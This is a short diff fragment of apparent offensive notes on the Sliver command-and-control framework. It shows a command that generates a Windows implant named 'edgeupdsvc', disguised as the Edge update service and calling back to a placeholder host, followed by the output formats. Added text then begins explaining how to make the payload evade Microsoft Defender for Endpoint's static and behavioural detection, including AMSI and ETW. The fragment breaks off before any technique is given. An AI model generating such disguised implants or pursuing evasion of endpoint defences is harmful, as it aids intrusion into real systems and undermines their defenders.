@@ -8,3 +8,16 @@ generate --os windows \
   --name edgeupdsvc \
   --http https://ip:port \
   --save /tmp/edgeupdsvc.exe
+
+
+
+
+-f, --format             string    Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only) (default: exe)
+
+
+To make a Sliver payload not detectable by Microsoft Defender for Endpoint (MDE), you need to completely evade both static and behavioral detection, because:
+
+Sliver-generated EXEs are signatured → easily caught by MDE via static rules.
+Even with --evasion, binary patterns, import tables, and section names are not deeply obfuscated.
+
+MDE uses behavioral + memory analysis (AMSI, ETW, API hooking).
